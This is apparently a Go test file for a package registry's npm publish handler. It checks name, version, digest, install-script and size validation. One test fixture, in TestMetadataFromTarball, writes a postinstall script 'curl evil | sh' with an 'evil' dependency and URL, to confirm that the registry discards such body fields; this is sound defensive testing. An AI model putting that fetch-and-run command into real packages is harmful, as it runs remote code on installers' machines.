package npm

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/sha1" //nolint:gosec // npm's legacy shasum is sha1
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"maps"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"testing"

	"github.com/radiergummi/tspackages/internal/archive"
)

var inspectLimits = archive.Limits{MaxBytes: 128 << 20, MaxDecompressed: 128 << 20, MaxEntries: 1000}

// bodyConf describes a publish body; bodyOpts change it before npmBody
// renders it.
type bodyConf struct {
	name, version, tag string
	manifest           map[string]any    // the tarball's package/package.json
	bodyVersion        map[string]any    // extra fields of the body's version object
	files              map[string]string // further tarball files, by path below package/
	tarball            []byte            // replaces the built tarball
	length             *int
	top                map[string]string // raw top-level values; "" deletes the key
	attachments        map[string]string // further raw attachments
}

type bodyOpt func(*bodyConf)

// withName sets the package name everywhere: body, manifest and attachment.
func withName(n string) bodyOpt { return func(c *bodyConf) { c.name = n } }

// withVersion sets the version everywhere: key, dist-tag and manifest.
func withVersion(v string) bodyOpt { return func(c *bodyConf) { c.version = v } }

func withManifest(f func(m map[string]any)) bodyOpt { return func(c *bodyConf) { f(c.manifest) } }

func withBodyVersion(f func(m map[string]any)) bodyOpt { return func(c *bodyConf) { f(c.bodyVersion) } }

func withFile(path, body string) bodyOpt { return func(c *bodyConf) { c.files[path] = body } }

func withTarball(b []byte) bodyOpt { return func(c *bodyConf) { c.tarball = b } }

func withLength(n int) bodyOpt { return func(c *bodyConf) { c.length = &n } }

func withTop(key, raw string) bodyOpt { return func(c *bodyConf) { c.top[key] = raw } }

func withAttachment(key, raw string) bodyOpt { return func(c *bodyConf) { c.attachments[key] = raw } }

// npmBody builds a publish body shaped like libnpmpublish's buildMetadata:
// the tarball's package.json plus _id and dist as the version object, and
// top-level keys in its order.
func npmBody(t testing.TB, opts ...bodyOpt) []byte {
	t.Helper()
	c := &bodyConf{
		name: "pkg", version: "1.0.0", tag: "latest",
		manifest:    map[string]any{"description": "a package", "scripts": map[string]any{"test": "node test.js"}},
		bodyVersion: map[string]any{"gitHead": "0123456789abcdef", "_nodeVersion": "22.0.0", "_npmVersion": "11.0.0"},
		files:       map[string]string{"index.js": "module.exports = 1\n"},
		top:         map[string]string{},
		attachments: map[string]string{},
	}
	c.manifest["name"], c.manifest["version"] = "", ""
	for _, o := range opts {
		o(c)
	}
	if c.manifest["name"] == "" {
		c.manifest["name"] = c.name
	}
	if c.manifest["version"] == "" {
		c.manifest["version"] = c.version
	}
	tgz := c.tarball
	if tgz == nil {
		mf, err := json.Marshal(c.manifest)
		if err != nil {
			t.Fatal(err)
		}
		files := map[string]string{"package.json": string(mf)}
		maps.Copy(files, c.files)
		tgz = npmTarGz(t, files)
	}
	s1, s512 := sha1.Sum(tgz), sha512.Sum512(tgz) //nolint:gosec // npm's legacy shasum
	version := maps.Clone(c.manifest)
	version["_id"] = c.name + "@" + c.version
	version["dist"] = map[string]any{
		"integrity": "sha512-" + base64.StdEncoding.EncodeToString(s512[:]),
		"shasum":    hex.EncodeToString(s1[:]),
		"tarball":   "http://tsp.example/npm/" + c.name + "/-/" + c.name + "-" + c.version + ".tgz",
	}
	maps.Copy(version, c.bodyVersion)
	length := len(tgz)
	if c.length != nil {
		length = *c.length
	}
	attachments := map[string]any{c.name + "-" + c.version + ".tgz": map[string]any{
		"content_type": "application/octet-stream",
		"data":         base64.StdEncoding.EncodeToString(tgz),
		"length":       length,
	}}
	for k, v := range c.attachments {
		attachments[k] = json.RawMessage(v)
	}
	values := map[string]any{
		"_id": c.name, "name": c.name, "description": c.manifest["description"],
		"dist-tags": map[string]string{c.tag: c.version}, "versions": map[string]any{c.version: version},
		"access": nil, "_attachments": attachments,
	}
	keys := []string{"_id", "name", "description", "dist-tags", "versions", "access", "_attachments"}
	for k, raw := range c.top {
		if raw == "" {
			delete(values, k)
			continue
		}
		if _, ok := values[k]; !ok {
			keys = append(keys, k)
		}
		values[k] = json.RawMessage(raw)
	}
	var b bytes.Buffer
	b.WriteByte('{')
	first := true
	for _, k := range keys {
		v, ok := values[k]
		if !ok {
			continue
		}
		if !first {
			b.WriteByte(',')
		}
		first = false
		kb, _ := json.Marshal(k)
		vb, err := json.Marshal(v)
		if err != nil {
			t.Fatal(err)
		}
		b.Write(kb)
		b.WriteByte(':')
		b.Write(vb)
	}
	b.WriteByte('}')
	return b.Bytes()
}

// npmTarGz packs files below package/, as npm pack does.
func npmTarGz(t testing.TB, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, body := range files {
		if err := tw.WriteHeader(&tar.Header{Name: "package/" + name, Typeflag: tar.TypeReg, Mode: 0o644, Size: int64(len(body))}); err != nil {
			t.Fatal(err)
		}
		if _, err := io.WriteString(tw, body); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// attachedTarball returns the decoded .tgz attachment of a body.
func attachedTarball(t *testing.T, body []byte) []byte {
	t.Helper()
	var doc struct {
		Attachments map[string]struct{ Data string } `json:"_attachments"`
	}
	if err := json.Unmarshal(body, &doc); err != nil {
		t.Fatal(err)
	}
	for k, a := range doc.Attachments {
		if strings.HasSuffix(k, ".tgz") {
			b, err := base64.StdEncoding.DecodeString(a.Data)
			if err != nil {
				t.Fatal(err)
			}
			return b
		}
	}
	t.Fatal("no tarball attachment")
	return nil
}

// inspect runs Inspect with a fresh temp dir and checks that a failure
// leaves nothing behind.
func inspect(t *testing.T, body []byte, name string, maxUpload int64) (*Publication, error) {
	t.Helper()
	dir := t.TempDir()
	p, err := Inspect(bytes.NewReader(body), mustName(t, name), maxUpload, inspectLimits, dir)
	if err != nil {
		if p != nil {
			t.Errorf("Inspect returned a publication with error %v", err)
		}
		if left, _ := os.ReadDir(dir); len(left) != 0 {
			t.Errorf("temp files left after %v: %v", err, left)
		}
		return nil, err
	}
	t.Cleanup(func() {
		p.Tarball.Close()
		os.Remove(p.Tarball.Name())
	})
	if filepath.Dir(p.Tarball.Name()) != dir {
		t.Errorf("tarball %s is not in %s", p.Tarball.Name(), dir)
	}
	return p, nil
}

func mustInspect(t *testing.T, body []byte, name string) (*Publication, map[string]json.RawMessage) {
	t.Helper()
	p, err := inspect(t, body, name, 64<<20)
	if err != nil {
		t.Fatal(err)
	}
	var doc map[string]json.RawMessage
	if err := json.Unmarshal(p.Doc, &doc); err != nil {
		t.Fatalf("Doc is not JSON: %v\n%s", err, p.Doc)
	}
	return p, doc
}

func TestInspectValid(t *testing.T) {
	body := npmBody(t, withFile("lib/a.js", "abc"))
	tgz := attachedTarball(t, body)
	p, doc := mustInspect(t, body, "pkg")
	s1, s256, s512 := sha1.Sum(tgz), sha256.Sum256(tgz), sha512.Sum512(tgz) //nolint:gosec // npm's legacy shasum
	if p.SHA1 != hex.EncodeToString(s1[:]) || p.SHA256 != hex.EncodeToString(s256[:]) || p.SHA512 != hex.EncodeToString(s512[:]) {
		t.Errorf("digests %s %s %s", p.SHA1, p.SHA256, p.SHA512)
	}
	if p.Size != int64(len(tgz)) || p.Tag != "latest" || p.Name.Exact != "pkg" || p.Version.String() != "1.0.0" || p.Sigstore != nil {
		t.Errorf("publication %+v", p)
	}
	got, err := io.ReadAll(p.Tarball)
	if err != nil || !bytes.Equal(got, tgz) {
		t.Errorf("tarball file differs from the attachment (%v)", err)
	}
	var manifest map[string]any
	if err := json.Unmarshal(npmBodyManifest(t, body), &manifest); err != nil {
		t.Fatal(err)
	}
	mf, _ := json.Marshal(manifest)
	wantUnpacked := int64(len(mf) + len("module.exports = 1\n") + len("abc"))
	if p.Dist.FileCount != 3 || p.Dist.UnpackedSize != wantUnpacked {
		t.Errorf("fileCount %d unpackedSize %d, want 3 %d", p.Dist.FileCount, p.Dist.UnpackedSize, wantUnpacked)
	}
	if p.Dist.Integrity != "sha512-"+base64.StdEncoding.EncodeToString(s512[:]) || p.Dist.Shasum != p.SHA1 || p.Dist.Tarball != "" {
		t.Errorf("dist %+v", p.Dist)
	}
	for k, want := range map[string]string{"_id": `"pkg@1.0.0"`, "name": `"pkg"`, "version": `"1.0.0"`, "_hasShrinkwrap": `false`, "_npmVersion": `"11.0.0"`} {
		if string(doc[k]) != want {
			t.Errorf("Doc[%s] = %s, want %s", k, doc[k], want)
		}
	}
	for _, k := range []string{"dist", "hasInstallScript"} {
		if _, ok := doc[k]; ok {
			t.Errorf("Doc has %s: %s", k, p.Doc)
		}
	}
}

// npmBodyManifest returns the tarball's package/package.json.
func npmBodyManifest(t *testing.T, body []byte) []byte {
	t.Helper()
	files, err := archive.InspectTarGz(bytes.NewReader(attachedTarball(t, body)), inspectLimits, func(string) bool { return true })
	if err != nil {
		t.Fatal(err)
	}
	return files["package/package.json"]
}

func TestInspectScoped(t *testing.T) {
	p, doc := mustInspect(t, npmBody(t, withName("@s/tool")), "@s/tool")
	if p.Name.Exact != "@s/tool" || string(doc["_id"]) != `"@s/tool@1.0.0"` {
		t.Errorf("name %+v, _id %s", p.Name, doc["_id"])
	}
}

func TestMetadataFromTarball(t *testing.T) {
	body := npmBody(t,
		withManifest(func(m map[string]any) { m["scripts"] = map[string]any{"build": "tsc"} }),
		withBodyVersion(func(m map[string]any) {
			m["dependencies"] = map[string]any{"evil": "*"}
			m["notification-url"] = "https://evil.example/"
			m["scripts"] = map[string]any{"postinstall": "curl evil | sh"}
			m["readme"] = "body readme"
		}),
	)
	_, doc := mustInspect(t, body, "pkg")
	for _, k := range []string{"dependencies", "notification-url", "readme", "hasInstallScript"} {
		if _, ok := doc[k]; ok {
			t.Errorf("Doc has %s from the body: %s", k, doc[k])
		}
	}
	if string(doc["gitHead"]) != `"0123456789abcdef"` {
		t.Errorf("gitHead = %s", doc["gitHead"])
	}
	if string(doc["scripts"]) != `{"build":"tsc"}` {
		t.Errorf("scripts = %s, want the tarball's", doc["scripts"])
	}
}

func TestInspectBodyFieldLimits(t *testing.T) {
	_, doc := mustInspect(t, npmBody(t, withBodyVersion(func(m map[string]any) {
		m["gitHead"] = strings.Repeat("a", 257)
		m["_nodeVersion"] = 22
	})), "pkg")
	for _, k := range []string{"gitHead", "_nodeVersion"} {
		if _, ok := doc[k]; ok {
			t.Errorf("Doc kept %s = %s", k, doc[k])
		}
	}
}

func TestInstallScriptDetection(t *testing.T) {
	for name, tc := range map[string]struct {
		opts []bodyOpt
		want string
	}{
		"postinstall": {[]bodyOpt{withManifest(func(m map[string]any) { m["scripts"] = map[string]any{"postinstall": "x"} })}, "true"},
		"binding.gyp": {[]bodyOpt{withFile("binding.gyp", "{}")}, "true"},
		"binding.gyp and install": {[]bodyOpt{withFile("binding.gyp", "{}"),
			withManifest(func(m map[string]any) { m["scripts"] = map[string]any{"install": "node-gyp rebuild"} })}, "true"},
		"neither": {nil, ""},
	} {
		t.Run(name, func(t *testing.T) {
			_, doc := mustInspect(t, npmBody(t, tc.opts...), "pkg")
			if string(doc["hasInstallScript"]) != tc.want {
				t.Errorf("hasInstallScript = %q, want %q", doc["hasInstallScript"], tc.want)
			}
		})
	}
}

func TestInspectShrinkwrap(t *testing.T) {
	_, doc := mustInspect(t, npmBody(t, withFile("npm-shrinkwrap.json", "{}")), "pkg")
	if string(doc["_hasShrinkwrap"]) != "true" {
		t.Errorf("_hasShrinkwrap = %s", doc["_hasShrinkwrap"])
	}
}

func TestBinString(t *testing.T) {
	_, doc := mustInspect(t, npmBody(t, withName("@s/tool"), withManifest(func(m map[string]any) { m["bin"] = "cli.js" })), "@s/tool")
	if string(doc["bin"]) != `{"tool":"cli.js"}` {
		t.Errorf("bin = %s", doc["bin"])
	}
}

func TestBundledDependenciesKept(t *testing.T) {
	_, doc := mustInspect(t, npmBody(t, withManifest(func(m map[string]any) {
		m["bundledDependencies"] = []string{"a"}
		m["bundleDependencies"] = []string{"b"}
	})), "pkg")
	if string(doc["bundledDependencies"]) != `["a"]` || string(doc["bundleDependencies"]) != `["b"]` {
		t.Errorf("bundled %s, bundle %s", doc["bundledDependencies"], doc["bundleDependencies"])
	}
}

func TestBundledManifestIgnored(t *testing.T) {
	_, doc := mustInspect(t, npmBody(t, withFile("node_modules/x/package.json", `{"name":"x","version":"9.9.9"}`)), "pkg")
	if string(doc["name"]) != `"pkg"` || string(doc["version"]) != `"1.0.0"` {
		t.Errorf("Doc = %s %s", doc["name"], doc["version"])
	}
}

func TestInspectSigstore(t *testing.T) {
	bundle := `{"mediaType":"application/vnd.dev.sigstore.bundle.v0.3+json"}`
	data, _ := json.Marshal(bundle)
	raw := `{"content_type":"application/vnd.dev.sigstore.bundle.v0.3+json","data":` + string(data) + `,"length":` + strconv.Itoa(len(bundle)) + `}`
	p, _ := mustInspect(t, npmBody(t, withAttachment("pkg-1.0.0.sigstore", raw)), "pkg")
	if string(p.Sigstore) != bundle {
		t.Errorf("Sigstore = %s", p.Sigstore)
	}
}

func TestInspectRejects(t *testing.T) {
	otherDigest := sha512.Sum512([]byte("other"))
	bigSig, _ := json.Marshal(strings.Repeat("x", 1<<20+1))
	long := "1.0.0-" + strings.Repeat("a", 151)
	for name, tc := range map[string]struct {
		body      []byte
		url       string
		maxUpload int64
		status    int
	}{
		"url name differs":      {body: npmBody(t, withName("other")), status: 400},
		"body name differs":     {body: npmBody(t, withTop("name", `"other"`)), status: 400},
		"body _id differs":      {body: npmBody(t, withTop("_id", `"other"`)), status: 400},
		"manifest name differs": {body: npmBody(t, withManifest(func(m map[string]any) { m["name"] = "other" })), status: 400},
		"uppercase name":        {body: npmBody(t, withName("Pkg")), url: "Pkg", status: 400},
		"two versions":          {body: npmBody(t, withTop("versions", `{"1.0.0":{},"1.0.1":{}}`)), status: 400},
		"no versions":           {body: npmBody(t, withTop("versions", `{}`)), status: 400},
		"tag names another":     {body: npmBody(t, withTop("dist-tags", `{"latest":"2.0.0"}`)), status: 400},
		"two tags":              {body: npmBody(t, withTop("dist-tags", `{"latest":"1.0.0","next":"1.0.0"}`)), status: 400},
		"invalid tag":           {body: npmBody(t, withTop("dist-tags", `{"v2":"1.0.0"}`)), status: 400},
		"two tarballs": {body: npmBody(t, withAttachment("pkg-1.0.1.tgz",
			`{"content_type":"application/octet-stream","data":"","length":0}`)), status: 400},
		"length mismatch": {body: npmBody(t, withLength(3)), status: 400},
		"integrity mismatch": {body: npmBody(t, withBodyVersion(func(m map[string]any) {
			m["dist"] = map[string]any{"integrity": "sha512-" + base64.StdEncoding.EncodeToString(otherDigest[:])}
		})), status: 400},
		"shasum mismatch": {body: npmBody(t, withBodyVersion(func(m map[string]any) {
			m["dist"] = map[string]any{"shasum": strings.Repeat("0", 40)}
		})), status: 400},
		"no package.json":        {body: npmBody(t, withTarball(npmTarGz(t, map[string]string{"index.js": "x"}))), status: 400},
		"not a tarball":          {body: npmBody(t, withTarball([]byte("not gzip"))), status: 400},
		"manifest not json":      {body: npmBody(t, withTarball(npmTarGz(t, map[string]string{"package.json": "{"}))), status: 400},
		"manifest too deep":      {body: npmBody(t, withTarball(npmTarGz(t, map[string]string{"package.json": strings.Repeat("[", 65) + strings.Repeat("]", 65)}))), status: 400},
		"manifest version":       {body: npmBody(t, withManifest(func(m map[string]any) { m["version"] = "1.0.1" })), status: 400},
		"version not strict":     {body: npmBody(t, withVersion("1.0.0-01")), status: 400},
		"157-byte version":       {body: npmBody(t, withVersion(long)), status: 400},
		"malformed":              {body: []byte(`{"name":"pkg",`), status: 400},
		"not an object":          {body: []byte(`[]`), status: 400},
		"trailing data":          {body: append(npmBody(t), `{}`...), status: 400},
		"data not base64":        {body: bytes.Replace(npmBody(t), []byte(`"data":"`), []byte(`"data":"!`), 1), status: 400},
		"tarball over maxUpload": {body: npmBody(t), maxUpload: 16, status: 413},
		"sigstore over 1 MiB":    {body: npmBody(t, withAttachment("pkg-1.0.0.sigstore", `{"data":`+string(bigSig)+`}`)), status: 413},
		"two sigstores": {body: npmBody(t, withAttachment("pkg-1.0.0.sigstore", `{"data":"{}"}`),
			withAttachment("pkg-1.0.1.sigstore", `{"data":"{}"}`)), status: 400},
	} {
		t.Run(name, func(t *testing.T) {
			url := tc.url
			if url == "" {
				url = "pkg"
			}
			maxUpload := tc.maxUpload
			if maxUpload == 0 {
				maxUpload = 64 << 20
			}
			_, err := inspect(t, tc.body, url, maxUpload)
			var re *RequestError
			if !errors.As(err, &re) || re.Status != tc.status {
				t.Fatalf("err = %v, want status %d", err, tc.status)
			}
		})
	}
}

func TestInspectNoTarball(t *testing.T) {
	for name, body := range map[string][]byte{
		"no attachments":   npmBody(t, withTop("_attachments", "")),
		"empty":            npmBody(t, withTop("_attachments", `{}`)),
		"deprecate":        npmBody(t, withTop("_attachments", ""), withTop("versions", `{"1.0.0":{"deprecated":"x"},"1.0.1":{}}`), withTop("dist-tags", `{"latest":"1.0.1","next":"1.0.0"}`)),
		"sigstore only":    npmBody(t, withTop("_attachments", `{"pkg-1.0.0.sigstore":{"data":"{}"}}`)),
		"other attachment": npmBody(t, withTop("_attachments", `{"readme.md":{"data":"eA=="}}`)),
	} {
		t.Run(name, func(t *testing.T) {
			if _, err := inspect(t, body, "pkg", 64<<20); !errors.Is(err, ErrNoTarball) {
				t.Fatalf("err = %v, want ErrNoTarball", err)
			}
		})
	}
}

func TestInspectMemory(t *testing.T) {
	if testing.Short() {
		t.Skip("writes a 64 MiB tarball")
	}
	var tgz bytes.Buffer
	gz, _ := gzip.NewWriterLevel(&tgz, gzip.NoCompression)
	tw := tar.NewWriter(gz)
	manifest := `{"name":"big","version":"1.0.0"}`
	tw.WriteHeader(&tar.Header{Name: "package/package.json", Typeflag: tar.TypeReg, Mode: 0o644, Size: int64(len(manifest))})
	io.WriteString(tw, manifest)
	tw.WriteHeader(&tar.Header{Name: "package/big.bin", Typeflag: tar.TypeReg, Mode: 0o644, Size: 64 << 20})
	tw.Write(make([]byte, 64<<20))
	tw.Close()
	gz.Close()

	path := filepath.Join(t.TempDir(), "body.json")
	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	io.WriteString(f, `{"_id":"big","name":"big","dist-tags":{"latest":"1.0.0"},"versions":{"1.0.0":{"name":"big","version":"1.0.0"}},`+
		`"_attachments":{"big-1.0.0.tgz":{"content_type":"application/octet-stream","data":"`)
	enc := base64.NewEncoder(base64.StdEncoding, f)
	enc.Write(tgz.Bytes())
	enc.Close()
	io.WriteString(f, `","length":`+strconv.Itoa(tgz.Len())+`}}}`)
	if _, err := f.Seek(0, io.SeekStart); err != nil {
		t.Fatal(err)
	}
	defer f.Close()

	dir := t.TempDir()
	runtime.GC()
	var before, after runtime.MemStats
	runtime.ReadMemStats(&before)
	p, err := Inspect(f, mustName(t, "big"), 128<<20, inspectLimits, dir)
	runtime.ReadMemStats(&after)
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(p.Tarball.Name())
	defer p.Tarball.Close()
	if p.Size != int64(tgz.Len()) {
		t.Errorf("size %d, want %d", p.Size, tgz.Len())
	}
	if grew := after.TotalAlloc - before.TotalAlloc; grew > 32<<20 {
		t.Fatalf("allocated %d MiB", grew>>20)
	}
	t.Logf("allocated %d KiB", (after.TotalAlloc-before.TotalAlloc)>>10)
}
